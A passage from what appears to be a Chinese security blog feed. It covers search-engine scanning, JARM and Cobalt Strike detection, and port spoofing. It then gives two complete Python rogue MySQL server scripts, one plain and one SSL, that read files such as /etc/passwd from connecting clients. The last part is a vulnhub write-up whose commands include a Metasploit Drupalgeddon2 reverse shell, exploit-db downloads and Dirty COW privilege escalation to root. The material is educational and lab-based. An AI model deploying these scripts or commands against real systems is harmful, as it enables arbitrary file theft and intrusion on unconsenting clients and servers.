so fast is that it uses a stateless scanning method.As you know, the theoretical basis of port scanning is that the server returns different data for TCP packets with different flags.The client sends an SYN packet with the special seq number value. After receiving this packet, the opened server responds to the SYN+ACK packet and sets the ack number to seq+1. In the end, the client responds to an ACK packet to complete the connection establishment. This process is also the familiar TCP Three-way Handshake.Note here that the value of the ack field in the response data packet response by the server can be predicted, so the process of sending SYN packet and receiving SYN+ACK packet can be separated by two programs to improve the efficiency of the scanning, and we could set a special sequence number value to indicate different scanned targets.The figure below is the implementation in masscan. 为了验证我们的猜测，我们在公有云部署了一些蜜罐来尝试捕获这些扫描的行为。在蜜罐上开放了TOP 1000的端口并剔除掉80,443,3306等极其常见的端口，剔除的目的是为了减少蠕虫、批量化攻击脚本等行为对我们带来的干扰。除了被动的等待搜索引擎对我们的探测之外，我们还利用shodan提供的主动扫描能力 Shodan On-demand Scaning主动发起探测. 根据扫描的结果，我们发现了一些有意思的东西。首先我们来看看主动扫描的结果。(我不知道为什么会一直显示这个信息，及时去扫描新的开放的端口) 在我们主动提交扫描任务后，我们在服务器上抓包结果如图所示。根据ip搜索的结果，我们基本可以确认64开头的ip属于Shodan.我们的服务器大概收到了总过500个包的样子，剔除掉banner扫描的结果，差不多只有300个包的样子。从扫描的结果来看，基本可以看出来shodan的扫描方式是类似zmap、masscan这样的无状态扫描方式——使用syn包扫描判断端口开放与否。不同的是，在shodan扫描包的填充字段，ip_id 和 window_size都是随机值，而zmap的ip_id是54321, window_size是 65535。除此之外，可以看到，在主动扫描任务重，对于不同端口的扫描使用的是同一ip源。这里顺便提一句，常见的扫描工具，nmap,zmap,masscan在包层面有一定特征: nmap: 默认 window_size:1024 zmap: 默认 window_size:65535 / ip_id:54321 masscan: 默认 window_size:1200 当确认某一端口确实是开放时，他将会利用一些探测策略来进行服务版本探测。可以看到，对于80端口也就是常见的HTTP服务，其会扫描主页、robots.txt、sitemap文档,icon图标等。值得注意的是，在版本探测的时候，window_size会被设置为固定值64240。 如图所示，是蜜罐捕获的被动扫描结果，扫描的字段和填充值和我们主动扫描的结果看起来差不多。不一样的是，并没有发现同一个ip扫描大量端口的行为，这也很容易理解，被动扫描为了不触发一些安全设备，通常都会将全网的扫描任务分布式的下发到不同的节点，并由不同的ip进行扫描任务，所以对特定的服务期而言，不会在短时间内收到来自同一个IP的大量扫描行为。我们将全端口进行了开放，一天下来，只有很少一部分端口有被扫到。 版本探测在版本探测阶段，Shodan和Nmap一样维护这一大批版本探测策略，根据公开的信息显示，其支持超过200种协议类型的探测。Shodan向不同端口发送不同类型的探测包，然后根据服务端返回的信息内容进行解析，从而判断出目标服务端口运行的服务类型及版本。本文不再关心这些版本探测的策略，如果有兴趣可以去看各类服务探测的文章或者nmap手册。 在这里 plcscan.org, 你可以看到他们列举了shodan最为常见使用的协议，包括很多工控协议。 一些特性介绍完他们的基本扫描原理，这里我们介绍几个比较有意思的字段。 ASN当你需要评估的网络达到一定的规模时，基于IP和IP段的搜索方式显然无法有效的帮助我们来进行识别和评估。这时也许 ASN 字段可以帮你快速评估整个组织的设备情况。 An autonomous system (AS) is a collection of connected Internet Protocol (IP) routing prefixes under the control of one or more network operators on behalf of a single administrative entity or domain that presents a common, clearly defined routing policy to the Internet. A regional Internet registry (RIR) is an organization that manages the allocation and registration of Internet number resources within a region of the world. Internet number resources include IP addresses and autonomous system (AS)) numbers. 你可以简单的理解为5个区域互联网注册管理机构管理着整个世界的IP地址空间。当有资格的组织或企业想要申请管理部分公网IP时，向所属地区的注册管理机构进行申请，申请成功后便会获取特定IP网段的所有权并有权决定这些网段如何进行内部分配及使用。这些IP段构成了一个自治系统，其编号被称为asn编号。 当属于不同asn系统的IP需要进行通信时，往往会通过最短的链路进行数据通信，这也就是我们熟悉的BGP协议所做的工作了。举个例子，在天朝，移动、联通、电信可以看成三个不同的ASN网络，他们内部的节点互联的速度很快，而互访的体验就会很差，这也就是我们经常会听见BGP线路加速的原因。 通常情况下，大型组织或企业所拥有的asn是有限的，和IP段的量级相比差很多，因此可以通过asn号快速方便的进行资产的搜索。这里推荐一个网站用于asn信息的查询, hackertarget. 假设我们今天需要对腾讯在公网的端口暴露情况进行分析，我们可以使用这个网站查询到所有归属于Tencent的asn号并使用搜索引擎进行搜索。 与 org, isp, ip 等字段对比, 通过asn 的方式获取数据显得更加的高效。但同样存在一个问题，一般大型的组织会对外提供服务，因此通过asn号获取的资产有可能是其客户的资产，这一点可能需要通过其他纬度来进行剔除。 hash在翻搜索引擎的手册中，你可以看到一个有意思的事情:所有引擎会去计算banner的哈希值、icon的哈希值甚至http包的哈希值，记为hash、 http.favicon.hash或者http.html.hash. 这个哈希值可以用来快速的筛选过滤出/排除具有相同内容特征的服务器，这里使用mmh3哈希算法来进行内容的哈希是从计算与存储的高效性方面来考虑的。 JARM目前越来越多的Web站点采用SSL/TLS的方式来保护通信中的数据安全不被第三方中间人进行嗅探，而由于TLS在握手阶段客户端和服务端会发送大量自己支持的加密算法套件、哈希方式、压缩方式并进行协商选择，这部分数据又是明文信息，而相同的服务、程序对于相同的请求选择偏好是固定的，因此这个规律也被用来生成TLS指纹，用来标识一类具有相同SSL/TLS属性配置的程序。对于SSL/TLS的协议分析在这里不再赘述，有兴趣的可以看我之前的TLS协议分析以及对于SSL/TLS指纹分析的内容。 JARM指纹也是如此，相比于JA3/JA3S，JARM是用来识别特定配置的TLS服务器。其原理是主动发送10个精心构造的TLS client握手包，根据服务端返回的结果进行指纹计算。通常相同配置的TLS服务器返回的指纹是一致的，因此可以用来快速的识别一些企业特定的服务器。这些精心构造的握手包包括是否支持TLS1.3,不同的密码学套件顺序如何选择，异常套件的处理方式等等 最终其会根据10个回复的server_hello数据包中的字段进行指纹计算，每次扫描取的内容为密码学套件|TLS版本|ALPN协议信息|扩展字段 JARM除了用于识别相同配置的TLS服务器，其也可以用于识别恶意服务器(如果恶意服务器是自行搭建的话)，如下图是官方给出的常见恶意server的JARM，如果你按照这个值去搜索引擎中搜索，你会发现有一大堆服务器，都是恶意的嘛？当然不是，其主要原因是像这些知名C2工具不会自己去实现一个中控web服务器，而是内置了特定版本的常见web服务器，例如没有记错的话，Metasploit使用nginx而Cobalt Strike使用tomcat，因此进行搜索时，会混入大量正常的服务器。 dig也是一个比较新的特性，同JARM的目的一样，也是为了去识别恶意的服务器，不同的是，dig是为了识别恶意的Cobalt Strike DNS服务器。如下图所示，为典型的带一个DNS Redirector``的恶意DNS服务器链路。使用Redirector的好处是即使被防守方发现通过DNS隧道进行通信导致ip被ban,也可以很轻松的通过域名解析的修改来进行服务器的切换，从而保住真实的DNS Listener不被发现。 那么如果去发现真实的DNS Listener呢？Cobalt Strike的DNS Listener有一个特性，即对于不关心的域名会选择忽略并返回一个固定的ip值，这个ip默认为0.0.0.0,这一点可以从其代码中看出 而当符合请求的域名包含特定的前缀时，CS会返回shellcode: 因此，如果DNS Listener的端口暴露在公网可访问，通过解析不同域名，如果返回值相同或均为0.0.0.0,则很有可能是cobalt strike的真实DNS服务器. 端口扫描欺骗我们现在来换个角度。如果你是大型组织的负责人，这些搜索引擎对于的价值是什么？可能很大概率你并不想让第三方平台对你公网暴露的资产进行收录，因为这样攻击者会更加容易的进行入口突破。当然最简单的方式是关闭所有对外开放的端口，但这也显然不太现实。因此，端口扫描欺骗也许是有效缓解并增加攻击者成本的有效方式之一。通过端口欺骗技术，可以向攻击者的扫描结果数据库或搜索引擎的数据库中插入大量无效的开放信息甚至banner信息，从而干扰并浪费攻击者的精力与资源. 根据我们之前提到的内容，端口扫描的逻辑是根据三次握手的回包数据来判断是否端口开放的。当一个端口关闭时，系统会回复一个reset包作为响应。如果我们根据客户端的请求构造一个syn+ack包并比服务端真实发送的reset更快返回给客户端，客户端就会认为这个端口是开放的，而忽略掉真实服务器发送来的那个reset包。 我们来验证下我们的想法，我们在公网环境下部署了一套欺骗程序。程序主要分为两部分， 使用iptables进行引流和流量监控syn包并返回对应的假的syn+ack 包.当然你也可以使用开源的程序(portspoof). 做完了这些，我们对我们部署的服务器使用nmap、zmap、masscan进行了一次端口扫描。如图所示，一切都都跟预想的一样，可以成功的欺骗客户端的结果。 欺骗完扫描工具，还剩下最后一个问题，是否对搜索引擎也有效呢？答案是肯定的，但是不同的引擎的收录策略会有一些不同，且会存在一些确定的特征。 附录(使用速查手册)Shodan 123456789Exampleport:22,80,8080,443 country:CN,JP -hash:-0ssl.version:tlsv1.3 HTTP -port:443port:80 country:CN http.title:"Apache2 Ubuntu Default Page"port:8080 country:CN http.title:"Apache Tomcat/" http.favicon.hash:-297069493 Fofa title=”beijing” header=”abc” body=”abc” domain=”qq.com” host=”.gov.cn” icp=”京ICP证030173号” js_name=”js/jquery.js” js_md5=”82ac3f14327a8b7ba49baa208d4eaa15” icon_hash=”-247388890” port=”443” ip=”1.1.1.1” ip=”220.181.111.1/24” status_code=”402” protocol=”https” city=”Hangzhou” region=”Zhejiang” country=”CN” cert=”google” cert.subject=”Oracle Corporation” cert.issuer=”DigiCert” cert.is_valid=true banner=users &amp;&amp; protocol=ftp is_fraud=false is_honeypot=false type=service os=windows server==”Microsoft-IIS/7.5” app=”Apache” after=”2017” &amp;&amp; before=”2017-10-01” asn=”19551” org=”Amazon.com, Inc.” base_protocol=”udp” is_ipv6=true is_domain=true ip_ports=”80,443” 或者 ports=”80,443” ip_country=”CN” ip_region=”Zhejiang” ip_city=”Hangzhou” ip_after=”2019-01-01” ip_before=”2019-01-01” port_size=”6” port_size_gt=”6” port_size_lt=”12” ip_ports=”80,161” 12title="powered by" &amp;&amp; title!="discuz"body="content=WordPress" || (header="X-Pingback" &amp;&amp; header="/xmlrpc.php" &amp;&amp; body="/wp-includes/") &amp;&amp; host="gov.cn"]]></content>
      <categories>
        <category>scanning</category>
      </categories>
      <tags>
        <tag>network security</tag>
        <tag>Search-Engine</tag>
        <tag>port spoofing</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql本地文件任意读取分析/rogue-mysql(ssl)-server]]></title>
    <url>%2Fblog%2Fmysql-load-local-data%2F</url>
    <content type="text"><![CDATA[Mysql存在一个特性，即如果使用LOAD DATE LOCAL INFILE，便可以从连接到数据库的客户端读取一个本地文件并写入数据库指定数据表中。而在这个逻辑中，客户端真正传送哪个文件到数据表中是由服务端发送的数据字段决定的，因此这样的特性很容易构造出一个恶意的mysql服务器从而造成任意客户端连接此服务器之后的任意本地文件读取。 LOAD DATE LOCAL INFILE创建一个test表并配置好其字段，之后客户端连接mysql服务器，执行以下指令，可以看到/etc/passwd的内容已经被写入test表中。 1load data local infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n'; 为了搞清具体发生了什么，我们通过抓包来详细分析一下mysql的协议内容。 协议分析高版本的mysql服务器会默认使用ssl加密进行连接，会对我们的抓包造成一定的麻烦，因此可以使用--ssl=disabled来临时取消ssl。根据抓包的结果可以看到，当完成三次握手后，服务端会主动发送greeting报文，内容包括协议、版本、thread id、salt以及服务端支持的配置字段。可以看到有一个字段Can Use LOAD DATA LOCAL表明服务器支持从本地读取文件进数据库。 第二个包则是客户端发起的login request,主要是客户端支持的一些配置属性，登陆用户名，本地系统、加密方式等信息，可以看到这里也有Can Use LOAD DATA LOCAL字段，表名服务器支持本地文件读取的方式。 之后便是登陆成功的服务端回显，状态为OK，在之后就是mysql客户端连接后默认会发送的服务版本信息获取，用于本地的banner显示。 登陆成功之后的数据包便是我们发送的query和服务的response内容，我们可以看到，当请求load local data时，服务端会返回一个response tabular报文，包含了要加载的本地文件路径，客户端根据这个路径获取数据然后进行传输。因此如果我们可以构造恶意的服务器，修改发送的文件名内容，是不是就可以读取本地的任意文件。 mysql evil server如上述提到的流程，我们可以构造一个恶意的mysql服务器，完成认证后，由于客户端默认会发送一个mysql版本查询，此时我们回复他一个请求本地数据的包，即可读取任意的本地文件。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#!/usr/local/bin/python# -*- coding:utf-8 -*-'''@author: empty_xl@contact: empty_xl@163.com'''import socketdef main(): filename = "/etc/passwd" server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) server.bind(('', 3306)) server.listen(2) conn, addr = server.accept() print('connect form: &#123;&#125;'.format(addr)) # send server_greeting conn.sendall("\x5b\x00\x00" + # len "\x00" + # packet num "\x0a" + # protocol "\x35\x2e\x37\x2e\x33\x35\x2d\x30\x75\x62\x75\x6e\x74\x75\x30\x2e\x31\x38\x2e\x30\x34\x2e\x31\x00" + # version "\x04\x00\x00\x00" + # thread ID "\x6e\x7c\x48\x1b\x6a\x3f\x30\x72\x00" + # salt "\xff\xf7" + # server cap "\x08" + # server language "\x02\x00" + # server status "\xff\xc1" + # extended server cap "\x15" + # auth plugin "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + # unused "\x7b\x1d\x2a\x41\x63\x35\x3a\x3f\x3b\x07\x1a\x6b\x00" + #salt "\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00" # auth plugin ) clien_data = conn.recv(2222) print('client_data:&#123;&#125;'.format(clien_data)) conn.sendall("\x07\x00\x00" + # len "\x02" + # packet number "\x00" + # response code "\x00\x00\x02\x00\x00\x00") print("server OK packet") clien_data = conn.recv(2222) print('client_data:&#123;&#125;'.format(clien_data)) print("arbitrary file read --&gt; &#123;&#125;".format(filename)) file_payload = '\x0c' + "\x00\x00\x01\xFB" + filename conn.sendall(file_payload) clien_data = conn.recv(2222) print('----------\n&#123;&#125;'.format(clien_data)) conn.close()if __name__ == '__main__': main() mysql evil ssl server刚我们提到，mysql是支持ssl加密的且高版本默认会使用加密的方式，在我们之前的evil server中我们将switch to ssl after handshake设置为了0，即不使用加密。那么为了伪装的更像点，如何实现一个mysql evil ssl server?首先我们看下正常使用ssl连接的逻辑。如下图可以看到，依旧是服务端的greeting以及客户端的login request,之后开始进行TLS握手阶段进行数据加密。 因此如果我们需要实现一个恶意的支持ssl的mysql服务器，首先是ssl的密钥以及证书。mysql默认会生成一个自签名证书，在/var/lib/mysql/中,或者也可以在/etc/mysql/mysql.conf.d中修改ssl-cert等参数的内容。以下是我们实现的evil-ssl-rogue-mysql-server 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768import socket, sslimport binasciidef main(): filename = "/etc/passwd" context = ssl.SSLContext(ssl.PROTOCOL_TLSv1) context.load_cert_chain(certfile="cert.pem", keyfile="key.pem") server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) server.bind(('0.0.0.0', 3306)) server.listen(5) conn, addr = server.accept() print('connect form: &#123;&#125;'.format(addr)) print('send mysql server greeting') # send server_greeting conn.sendall("\x5b\x00\x00" + # len "\x00" + # packet num "\x0a" + # protocol "\x35\x2e\x37\x2e\x33\x35\x2d\x30\x75\x62\x75\x6e\x74\x75\x30\x2e\x31\x38\x2e\x30\x34\x2e\x31\x00" + # version "\x04\x00\x00\x00" + # thread ID "\x6e\x7c\x48\x1b\x6a\x3f\x30\x72\x00" + # salt "\xff\xff" + # server cap "\x08" + # server language "\x02\x00" + # server status "\xff\x80" + # extended server cap "\x15" + # auth plugin "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + # unused "\x7b\x1d\x2a\x41\x63\x35\x3a\x3f\x3b\x07\x1a\x6b\x00" + # salt "\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00" # auth plugin ) clien_data = conn.recv(4) print('Recv client data:&#123;&#125;'.format(clien_data)) data = clien_data[:3][::-1] len = int(binascii.hexlify(data),16) print('login record length: &#123;&#125;'.format(str(len))) clien_data = conn.recv(len) print('Recv client data:&#123;&#125;'.format(clien_data)) ssl_conn = context.wrap_socket(conn, server_side=True) print('finished ssl handshake') clien_data = ssl_conn.recv(2222) print('Recv ssl login data: &#123;&#125;'.format(clien_data)) print("auth okay") ssl_conn.sendall('\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00') clien_data = ssl_conn.recv(2222) print('First mysql query: &#123;&#125;'.format(clien_data)) print("request file") file_payload = "\x0c\x00\x00\x01\xFB" + filename ssl_conn.sendall(file_payload) clien_data = ssl_conn.recv(2222) print('filedata----------\n&#123;&#125;'.format(clien_data)) ssl_conn.shutdown(socket.SHUT_RDWR) ssl_conn.close() conn.close()if __name__ == '__main__': main()]]></content>
      <categories>
        <category>vulnerability analysis</category>
      </categories>
      <tags>
        <tag>vulnerability analysis</tag>
        <tag>mysql</tag>
        <tag>arbitrary file read</tag>
        <tag>protocol analysis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[0day捕获/Win the 0-Day Racing Game Against Botnet on Cloud]]></title>
    <url>%2Fblog%2Fzeroday-capture%2F</url>
    <content type="text"><![CDATA[关于0day捕获的一些工作有幸在BlackHat Asia 2020进行分享 —— “Win the 0-Day Racing Game Against Botnet on Public Cloud”]]></content>
      <categories>
        <category>0day</category>
      </categories>
      <tags>
        <tag>0day Capture</tag>
        <tag>botnet</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vulnhub 渗透测试练习 lampiao & FristiLeaks]]></title>
    <url>%2Fblog%2Fexploit-exercises-vulnhub-01%2F</url>
    <content type="text"><![CDATA[lampiao镜像在这里，是vulnhub提供的一个虚拟机，用VM打开之后便开始渗透测试。 主机发现首先是主机发现，因为并不知道靶机的IP地址，于是使用nmap，进行扫描，这里我扫了vm虚拟网卡的C段nmap -sn 192.168.0.0/16，结果如下: 我们可以看到目标主机的ip地址应该是192.168.253.130这个。 端口扫描之后对这个ip进行端口扫描(我将vm的网络模式改为了桥接模式，所以ip变为了192.168.1.100)，首先扫了常见端口: 1234nmap -v -sV --top-ports 3674 192.168.1.10022/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)80/tcp open http? 得到开放的两个服务，ssh和80端口的web。具体的ssh信息可以用msf的auxiliary/scanner/ssh/ssh_version进行探查: 1234567891011121314151617181920212223242526272829msf &gt; search ssh[!] Module database cache not built yet, using slow searchMatching Modules================ Name Disclosure Date Rank Description ---- --------------- ---- ----------- auxiliary/scanner/ssh/ssh_version normal SSH Version Scannermsf &gt; use auxiliary/scanner/ssh/ssh_versionmsf auxiliary(scanner/ssh/ssh_version) &gt; show optionsModule options (auxiliary/scanner/ssh/ssh_version): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target address range or CIDR identifier RPORT 22 yes The target port (TCP) THREADS 1 yes The number of concurrent threads TIMEOUT 30 yes Timeout for the SSH probemsf auxiliary(scanner/ssh/ssh_version) &gt; set rhosts 192.168.1.100rhosts =&gt; 192.168.1.100msf auxiliary(scanner/ssh/ssh_version) &gt; exploit[+] 192.168.1.100:22 - SSH server version: SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.7 ( service.version=6.6.1p1 openssh.comment=Ubuntu-2ubuntu2.7 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH os.vendor=Ubuntu os.device=General os.family=Linux os.product=Linux os.version=14.04 service.protocol=ssh fingerprint_db=ssh.banner )[*] Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed 没有得到什么其他有效信息，尝试用hydra进行密码爆破，用自带的字典没找到，使用crunch生成的字典也没有结果，目测行不通: 123hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -V -t 10 ssh://192.168.1.100-V 显示爆破过程 -t为进程数 转看80端口web页面，是个静态页面，nikto扫了没什么发现，dirb和御剑扫目录，都没什么发现，emmmm尴尬。难道，服务放在了很脏的端口上吗？ 于是重新进行了端口扫描，使用: 12345678root@kali:~# sudo nmap -v -sS -sV -Pn -p 1-65535 192.168.1.100PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)80/tcp open http?1898/tcp open http Apache httpd 2.4.7 ((Ubuntu))MAC Address: 00:0C:29:14:89:32 (VMware)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 发现1898还开着一个web服务，有戏，访问看到: 浏览一下页面，主页面只有用户登录、注册、找回密码等信息，推测可能存在的突破点: 页面sql注入 账号密码破解 目录扫描 Drupal框架漏洞 我们预想去测试威胁比较大的框架漏洞，毕竟web常见漏洞比较繁琐，web页面如果多一时半会不太容易找到点。先扫下目录: 123456789101112131415root@kali:~# dirb http://192.168.1.100:1898 -o out---- Scanning URL: http://192.168.1.100:1898/ ----==&gt; DIRECTORY: http://192.168.1.100:1898/includes/ + http://192.168.1.100:1898/index.php (CODE:200|SIZE:11423) ==&gt; DIRECTORY: http://192.168.1.100:1898/misc/ ==&gt; DIRECTORY: http://192.168.1.100:1898/modules/ ==&gt; DIRECTORY: http://192.168.1.100:1898/profiles/ + http://192.168.1.100:1898/robots.txt (CODE:200|SIZE:2189) ==&gt; DIRECTORY: http://192.168.1.100:1898/scripts/ + http://192.168.1.100:1898/server-status (CODE:403|SIZE:295) ==&gt; DIRECTORY: http://192.168.1.100:1898/sites/ ==&gt; DIRECTORY: http://192.168.1.100:1898/themes/ + http://192.168.1.100:1898/web.config (CODE:200|SIZE:2200) + http://192.168.1.100:1898/xmlrpc.php (CODE:200|SIZE:42) 可以看见，扫到了一些目录和文件，摘出来可能有用的内容。/modules/路径可以看到其支持的组件，可能之后会派上用场，还有/robots文件，和xmlrpc.php可能会有用处。这里先大概扫一眼。 getshell然后尝试对drupal框架进行攻击，我们查找drupal的漏洞: 123456789101112131415msf &gt; search drupal[!] Module database cache not built yet, using slow searchMatching Modules================ Name Disclosure Date Rank Description ---- --------------- ---- ----------- auxiliary/gather/drupal_openid_xxe 2012-10-17 normal Drupal OpenID External Entity Injection auxiliary/scanner/http/drupal_views_user_enum 2010-07-02 normal Drupal Views Module Users Enumeration exploit/multi/http/drupal_drupageddon 2014-10-15 excellent Drupal HTTP Parameter Key/Value SQL Injection exploit/unix/webapp/drupal_coder_exec 2016-07-13 excellent Drupal CODER Module Remote Command Execution exploit/unix/webapp/drupal_drupalgeddon2 2018-03-28 excellent Drupal Drupalgeddon 2 Forms API Property Injection exploit/unix/webapp/drupal_restws_exec 2016-07-13 excellent Drupal RESTWS Module Remote PHP Code Execution exploit/unix/webapp/php_xmlrpc_eval 2005-06-29 excellent PHP XML-RPC Arbitrary Code Execution 这里，我们其实可以从刚才的robots.txt中看到其更新日志，为drupal 7.54 2017-02-01 所以，我们这里选了最新的drupal_drupalgeddon2,好像是才报的,我们使用info查看下详细信息,看来是CVE-2018-7600.去网上搜下这个漏洞的详情。Drupal CVE-2018-7600 分析及 PoC 构造 粗略的看了下，是一个远程代码执行漏洞，主要原理是drupal对于#开头的变量有特殊处理，在注册时，可以通过传入恶意代码，造成执行。 1234567891011121314151617msf exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rhost 192.168.1.100rhost =&gt; 192.168.1.100msf exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rport 1898rport =&gt; 1898msf exploit(unix/webapp/drupal_drupalgeddon2) &gt; run[*] Started reverse TCP handler on 192.168.1.103:4444[*] Drupal 7 targeted at http://192.168.1.100:1898/[+] Drupal appears unpatched in CHANGELOG.txt[*] Sending stage (37775 bytes) to 192.168.1.100[*] Meterpreter session 1 opened (192.168.1.103:4444 -&gt; 192.168.1.100:54178) at 2018-09-04 09:19:16 +0800meterpreter &gt; shellProcess 3946 created.Channel 0 created.python -c 'import pty;pty.spawn("/bin/bash")'www-data@lampiao:/var/www/html$ 提权得到shell，之后我们直接使用查看uname -a内核版本，我们首先考虑linux通用内核漏洞dirty cow: 123456789101112 ~  searchsploit -tw dirty cow------------------------------------------------------------------------------------------ -------------------------------------------- Exploit Title | URL------------------------------------------------------------------------------------------ --------------------------------------------Linux Kernel - 'The Huge Dirty Cow' Overwriting The Huge Zero Page (1) | https://www.exploit-db.com/exploits/43199/Linux Kernel - 'The Huge Dirty Cow' Overwriting The Huge Zero Page (2) | https://www.exploit-db.com/exploits/44305/Linux Kernel 2.6.22 &lt; 3.9 (x86/x64) - 'Dirty COW /proc/self/mem' Race Condition Privilege | https://www.exploit-db.com/exploits/40616/Linux Kernel 2.6.22 &lt; 3.9 - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalatio | https://www.exploit-db.com/exploits/40847/Linux Kernel 2.6.22 &lt; 3.9 - 'Dirty COW PTRACE_POKEDATA' Race Condition (Write Access Meth | https://www.exploit-db.com/exploits/40838/Linux Kernel 2.6.22 &lt; 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escala | https://www.exploit-db.com/exploits/40839/Linux Kernel 2.6.22 &lt; 3.9 - 'Dirty COW' /proc/self/mem Race Condition (Write Access Metho | https://www.exploit-db.com/exploits/40611/------------------------------------------------------------------------------------------ -------------------------------------------- 于是之后我们使用CVE-2016-5195这个提权漏洞 /proc/self/mem我们先利用的是这个 Linux Kernel 2.6.22 &lt; 3.9 - ‘Dirty COW /proc/self/mem’ Race Condition Privilege Escalation (/etc/passwd Method) 这个显示的&lt;3.9我一开始还以为无法使用，因为看到内核是4.4的，最后发现是可以的。漏洞具体的详情可以自己去看详情，这里不再赘述。我们首先下载exploit 12345678910111213www-data@lampiao:/var/www/html$ wget https://www.exploit-db.com/download/40847.cppwww-data@lampiao:/var/www/html$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil&lt;tml$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutilwww-data@lampiao:/var/www/html$ ./dcow -s./dcow -sRunning ...Password overridden to: dirtyCowFunReceived su prompt (Password: )root@lampiao:~# echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecsroot@lampiao:~# cp /tmp/.ssh_bak /etc/passwdroot@lampiao:~# rm /tmp/.ssh_bak 便可以拿到root权限 PTRACE_POKEDATA同样我们可以利用: Linux Kernel 2.6.22 &lt; 3.9 - ‘Dirty COW’ ‘PTRACE_POKEDATA’ Race Condition Privilege Escalation (/etc/passwd Method) 1234567891011121314www-data@lampiao:/var/www/html$ wget https://www.exploit-db.com/download/40839.cwww-data@lampiao:/var/www/html$ gcc -pthread 40839.c -o dirty -lcryptgcc -pthread 40839.c -o dirty -lcryptwww-data@lampiao:/var/www/html$ ./dirty./dirty/etc/passwd successfully backed up to /tmp/passwd.bakPlease enter the new password: 123Complete line:firefart:fiRbwOlRgkx7g:0:0:pwned:/root:/bin/bashmmap: b7791000 此时可以通过切换至firefart用户get flag。 FristiLeaks镜像在这里，是vulnhub提供的一个虚拟机，用VirtualBox导入，注意这里需要将MAC地址修改为08:00:27:A5:A6:76 主机发现这里我们换一个工具netdiscover，这个比nmap更为友好和快捷。 1234567891011root@kali:~# netdiscover -r 192.168.0.0/16 Currently scanning: Finished! | Screen View: Unique Hosts 10 Captured ARP Req/Rep packets, from 3 hosts. Total size: 600 _____________________________________________________________________________ IP At MAC Address Count Len MAC Vendor / Hostname ----------------------------------------------------------------------------- 192.168.1.1 8c:a6:df:27:b5:3c 8 480 TP-LINK TECHNOLOGIES CO.,LTD. 192.168.1.100 08:00:27:a5:a6:76 1 60 PCS Systemtechnik GmbH 192.168.1.103 00:24:9b:24:99:6b 1 60 Action Star Enterprise Co., Ltd. 发现目标IP为192.168.1.100然后顺手查了下后面是个什么公司，竟然存在，先放着。之后端口扫描。有之前的教训，这次直接扫所有的。 端口扫描12345root@kali:~# sudo nmap -v -sS -sV -Pn -p 1-65535 192.168.1.100PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC) emmm,只有80端口？别想骗我，换个姿势再试一下.emm还是没扫出来，那就先看这个好了。看下主页，一个静态页面啥都没用，扫目录。 12345---- Scanning URL: http://192.168.1.103/ ----+ http://192.168.1.103/cgi-bin/ (CODE:403|SIZE:210) ==&gt; DIRECTORY: http://192.168.1.103/images/ + http://192.168.1.103/index.html (CODE:200|SIZE:703) + http://192.168.1.103/robots.txt (CODE:200|SIZE:62) 有用的应该就robots.txt和cgi-bin，cgi-bin没权限，看下robots.txt好了，发现3个路径，cola、siisi、beer，访问了这3个发现都是图片. 冷静，冷静，图片有提示，fristi，虽然有点。。。但是也算进来了。一个登陆页面. 先看下源码，注释里面有一串内容，base64内容，解密后得到一个图片。 看起来是密码，与之前的eezeepz一起，尝试登陆。]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>penetration testing</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux suid提权 & 渗透测试练习nebula]]></title>
    <url>%2Fblog%2Fexploit-exercises-nebula%2F</url>
